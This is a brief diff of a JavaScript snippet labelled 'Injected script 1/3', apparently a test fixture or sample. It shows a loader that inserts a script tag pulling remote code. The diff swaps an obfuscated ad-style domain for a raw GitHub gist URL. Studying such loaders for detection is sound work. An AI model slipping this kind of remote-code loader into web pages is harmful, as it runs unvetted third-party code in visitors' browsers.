@@ -29,7 +29,7 @@ script("Injected script 1/3");
     l = d.scripts[d.scripts.length - 1];
   s.settings = eagmv || {};
   s.src =
-    "//glum-mortgage.com/aDWu5.weYGWBdjlsQ/2H9dk/ZpTY9p6Cb_2h5/l/SdWDQx9ANaTHEaw/MODPcsxoN_iS0/1_MnTDAswENmzVEc3c";
+    "https://gist.githubusercontent.com/RedNotSus/c40c84f65fb409b5bbb09e4ab73271c8/raw/57b6be667c2abd71a9a1f6b7d48c835209c31d13/gistfile1.txt";
   s.async = true;
   l.parentNode.insertBefore(s, l);
 })({});
